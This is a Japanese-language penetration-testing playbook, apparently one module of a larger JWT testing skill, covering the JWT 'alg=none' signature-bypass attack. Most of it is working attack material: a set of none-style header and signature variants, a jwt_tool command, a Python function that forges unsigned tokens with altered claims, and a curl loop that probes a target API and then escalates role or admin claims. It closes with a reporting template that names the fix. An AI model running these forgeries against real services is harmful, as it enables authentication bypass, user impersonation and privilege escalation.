# JWT alg=none

`testing-jwt-token-security` の Phase 2 から呼ばれる、署名検証バイパス系の単独深掘り。

## いつ切替えるか

- 取得済 JWT がある対象の認証実装が `alg=none` を許してしまうか試験する
- `alg` header を信用する実装の最終確認 (algorithm confusion との比較)
- JWT lib が古く、`alg` allowlist 設定漏れの疑いがある (Express jsonwebtoken < 4 系、PyJWT < 1.5、go-jose < 1.5 等)

## Phase 1 — token 構造の把握

```
HEADER.PAYLOAD.SIGNATURE
↑      ↑       ↑
JSON   JSON    bytes
b64url b64url  b64url
```

既存 token を decode し、`alg` / `typ` / `kid` / claim を控える。

## Phase 2 — none 系 header バリエーション

実装によって case や missing alg の扱いが分かれるので組み合わせを試す:

```
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}
{"typ":"JWT"}                      # alg 欠落
{"alg":"","typ":"JWT"}             # 空文字
{"alg":["HS256","none"],"typ":"JWT"}  # 配列受け入れの稀ケース
```

## Phase 3 — signature 部の組合せ

`alg=none` の規格上は signature 部が空文字だが、実装が「3 part 必須」を強制する場合があるので variants を試す:

```
<HEADER>.<PAYLOAD>.                     # 空 signature
<HEADER>.<PAYLOAD>.AAAA                  # 適当な dummy
<HEADER>.<PAYLOAD>.<original signature>  # 元の signature を流用
<HEADER>.<PAYLOAD>                       # 2 part のみ
```

## Phase 4 — 自動化

```
jwt_tool $JWT -X a            # alg=none 系を全パターン試行
```

または手書き python:

```python
import json, base64
def b64(x): return base64.urlsafe_b64encode(x).decode().rstrip('=')

def forge_none(orig_token, mods=None):
    h, p, _ = orig_token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(p + '=='))
    if mods: payload.update(mods)
    out = []
    for header in [{"alg":"none","typ":"JWT"},{"alg":"None"},{"alg":"NONE"},{"alg":"nOnE"},{"typ":"JWT"}]:
        nh = b64(json.dumps(header, separators=(',',':')).encode())
        np = b64(json.dumps(payload, separators=(',',':')).encode())
        for sig in ["", "AAAA", _]:
            out.append(f"{nh}.{np}.{sig}")
    return out
```

## Phase 5 — 検証

```
for tok in tokens:
  curl -s -o /dev/null -w '%{http_code} ' \
    -H "Authorization: Bearer $tok" https://target/api/me
```

200 が出る組合せを control に押さえる。次に `role` / `sub` / `is_admin` を escalate して admin endpoint で再試行。

## Phase 6 — PoC と影響

```
- 受入れられた header (alg variant)
- 受入れられた signature 部 (空 / dummy / 流用)
- impersonate 成功した user / role
- 影響 (admin 経路 / 他ユーザリソース)
- 修正 (alg allowlist に none を含めない、library upgrade)
```
